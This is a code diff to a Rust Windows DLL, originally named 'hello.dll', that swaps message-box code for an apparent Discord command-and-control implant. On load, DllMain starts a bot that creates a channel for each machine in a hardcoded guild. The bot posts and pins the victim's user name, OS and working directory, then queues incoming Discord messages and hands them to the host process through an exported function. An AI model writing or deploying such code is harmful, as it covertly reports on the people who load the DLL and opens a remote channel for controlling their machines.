@@ -1,171 +1,144 @@
 use serenity::async_trait;
-use serenity::model::channel::Message;
+use serenity::model::channel::{Message, ChannelType};
 use serenity::prelude::*;
+use serenity::model::id::GuildId;
 use serenity::Client;
+use std::env;
 use std::ffi::{CString, c_char};
 use std::sync::{Arc, Mutex};
 use std::collections::VecDeque;
-use serenity::utils::MessageBuilder;
 use serenity::model::gateway::Ready;
-use std::env;
+use once_cell::sync::{Lazy, OnceCell};
 use windows::Win32::Foundation::*;
 use windows::Win32::System::SystemServices::*;
-use windows::core::*;
-use windows::Win32::UI::WindowsAndMessaging::MessageBoxA;
+use std::thread;
 
-struct Handler {
-    message_queue: Arc<Mutex<VecDeque<String>>>, // Store messages
-}
+type MessageQueue = Arc<Mutex<VecDeque<String>>>;
+
+struct Handler;
 
 #[async_trait]
 impl EventHandler for Handler {
-    async fn message(&self, context: Context, msg: Message) {
-        // Check for "!hello" command
-        if msg.content == "!hello" {
-            let channel = match msg.channel_id.to_channel(&context).await {
-                Ok(channel) => channel,
-                Err(why) => {
-                    println!("Error getting channel: {:?}", why);
-                    return;
-                },
-            };
-
-            // Create the response message
-            let response = MessageBuilder::new()
-                .push("Hello, ")
-                .push_bold_safe(&msg.author.name)
-                .push("! How can I assist you today?")
-                .build();
-
-            // Send the response
-            if let Err(why) = msg.channel_id.say(&context.http, &response).await {
-                println!("Error sending message: {:?}", why);
-            }
-
-            // Store the message content in the queue
-            let mut queue = self.message_queue.lock().unwrap();
-            queue.push_back(msg.content.clone());
-        }
+    async fn message(&self, ctx: Context, msg: Message) {
+        enqueue_message(msg.content.clone());
+        let _ = msg.react(&ctx.http, '👍').await;
     }
 
-    async fn ready(&self, _: Context, ready: Ready) {
-        println!("Bot is connected as {}!", ready.user.name);
+    async fn ready(&self, ctx: Context, ready: Ready) {
+        send_initial_data(&ctx).await;
+        println!("{} is connected!", ready.user.name);
     }
 }
+async fn send_initial_data(ctx: &Context) {
+    const MY_GUILD_ID: u64 = 1083863758146912297;
+    let os = std::env::consts::OS;
+    let current_user = std::env::var("USER").unwrap_or_else(|_| {
+        std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string())
+    });
+    let session_id = format!("sess-{}-{}", os, current_user).to_lowercase().replace("\\", "-");
 
-static mut MESSAGE_QUEUE: Option<Arc<Mutex<VecDeque<String>>>> = None;
+    let channels = match ctx.http.get_channels(MY_GUILD_ID).await {
+        Ok(channels) => channels,
+        Err(err) => {
+            eprintln!("Error fetching channels: {:?}", err);
+            return;
+        }
+    };
+
+    if let Some(channel) = channels.iter().find(|ch| ch.name == session_id) {
+        if let Err(err) = channel.id.say(&ctx.http, "Online").await {
+            eprintln!("Error sending message: {:?}", err);
+        }
+    } else {
+        let guild = GuildId(MY_GUILD_ID);
+    
+        let new_channel_result = guild.create_channel(&ctx.http, |c| {
+            c.name(session_id.clone())
+            .kind(ChannelType::Text)
+        }).await;
+        
+        if let Ok(new_channel) = new_channel_result {
+            let current_dir = match env::current_dir() {
+                Ok(dir) => dir.display().to_string(),
+                Err(e) => {
+                    eprintln!("Error getting current directory: {}", e);
+                    return; // Exit if there's an error
+                }
+            };
+            let first_msg = format!(
+                "Session *{}* opened! 🥳\n\n**User**: {}\n**OS**: {}\n**Current Directory**: {}",
+                session_id, current_user, os, current_dir
+            );
+        
+            if let Ok(message) = new_channel.id.say(&ctx.http, &first_msg).await {
+                if let Err(_) = message.pin(&ctx.http).await {
+                }
+            }
+        } else {
+            // Handle the error if channel creation failed
+            if let Err(err) = new_channel_result {
+                eprintln!("Error creating channel: {:?}", err);
+            }
+        }
+    }
+}
+fn enqueue_message(message: String) {
+    let mut queue = MESSAGE_QUEUE.lock().unwrap();
+    queue.push_back(message);
+}
+
+
+static MESSAGE_QUEUE: Lazy<MessageQueue> = Lazy::new(|| Arc::new(Mutex::new(VecDeque::new())));
+static BOT_TASK: Lazy<OnceCell<thread::JoinHandle<()>>> = Lazy::new(|| OnceCell::new());
 
 #[no_mangle]
-pub extern "C" fn on_process_attach() {
-    let token = env::var("DISCORD_TOKEN").expect("Expected a token in the environment");
+pub fn attach_process() {
+    let token = "YOUR_DISCORD_TOKEN";
 
-    // Initialize the message queue safely
-    let message_queue = Arc::new(Mutex::new(VecDeque::new()));
-    unsafe {
-        MESSAGE_QUEUE = Some(message_queue.clone());
-    }
+    let bot_thread = thread::spawn(move || {
+        let runtime = tokio::runtime::Runtime::new().expect("Failed to create Tokio runtime");
 
-    // Start the Discord client asynchronously
-    let handler = Handler {
-        message_queue: message_queue.clone(),
-    };
-    
-    tokio::spawn(async move {
-        let mut client = Client::builder(&token)
-            .event_handler(handler)
-            .await
-            .expect("Error creating client");
+        runtime.block_on(async {
+            let mut client = Client::builder(&token)
+                .event_handler(Handler)
+                .await
+                .expect("Err creating client");
 
-        if let Err(why) = client.start().await {
-            println!("Client error: {:?}", why);
-        }
+            if let Err(why) = client.start().await {
+                eprintln!("Client error: {:?}", why);
+            }
+        });
     });
+    BOT_TASK.set(bot_thread).expect("Failed to set bot task");
 }
 
 #[no_mangle]
 pub extern "C" fn get_message() -> *const c_char {
-    // Access the message queue safely
-    let message_queue = unsafe {
-        MESSAGE_QUEUE
-            .as_ref()
-            .expect("MESSAGE_QUEUE has not been initialized")
-    };
-
-    // Lock the queue and check for messages
-    let mut queue = message_queue.lock().unwrap();
+    let mut queue = MESSAGE_QUEUE.lock().unwrap();
     if let Some(message) = queue.pop_front() {
-        CString::new(message).unwrap().into_raw() // Return C-compatible string
+        let c_string = CString::new(message).expect("CString conversion failed");
+        c_string.into_raw()
     } else {
         std::ptr::null()
     }
 }
 
 #[no_mangle]
-pub extern "C" fn free_message(msg: *const c_char) {
-    unsafe {
-        if !msg.is_null() {
-            CString::from_raw(msg as *mut c_char); // Free the C string
-        }
-    }
+pub fn detach_process() {
+    println!("Bot has been requested to shut down (not implemented).");
 }
 
 #[no_mangle]
 #[allow(non_snake_case)]
 extern "system" fn DllMain(
-    dll_module: HINSTANCE,
+    _dll_module: HINSTANCE,
     call_reason: u32,
     _: *mut (),
 ) -> bool {
     match call_reason {
-        DLL_PROCESS_ATTACH => attach(),
-        DLL_PROCESS_DETACH => detach(),
+        DLL_PROCESS_ATTACH => attach_process(),
+        DLL_PROCESS_DETACH => detach_process(),
         _ => (),
     }
-
     true
-}
-
-fn attach() {
-    unsafe {
-        MessageBoxA(HWND(std::ptr::null_mut()),
-            s!("ZOMG!"),
-            s!("hello.dll"),
-            Default::default()
-        );
-    }
-}
-
-fn detach() {
-    unsafe {
-        MessageBoxA(HWND(std::ptr::null_mut()),
-            s!("GOODBYE!"),
-            s!("hello.dll"),
-            Default::default()
-        );
-    }
-}
-#[cfg(test)]
-mod tests {
-    use super::*;
-    use std::env;
-
-    #[tokio::test]
-    async fn test_on_process_attach() {
-        // Set the DISCORD_TOKEN environment variable for testing
-        env::set_var("DISCORD_TOKEN", "YOUR_TOKEN");
-
-        // Call the function that starts the bot
-        on_process_attach();
-
-        // Optionally wait a moment for the bot to start
-        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
-
-        // You may want to check that the bot is running, or any other conditions
-        // Since the bot runs asynchronously, you might not be able to directly test it here
-        // Instead, you can check if MESSAGE_QUEUE was initialized
-        tokio::time::sleep(tokio::time::Duration::from_secs(20)).await;
-        unsafe {
-            assert!(MESSAGE_QUEUE.is_some(), "MESSAGE_QUEUE should be initialized");
-        }
-    }
 }
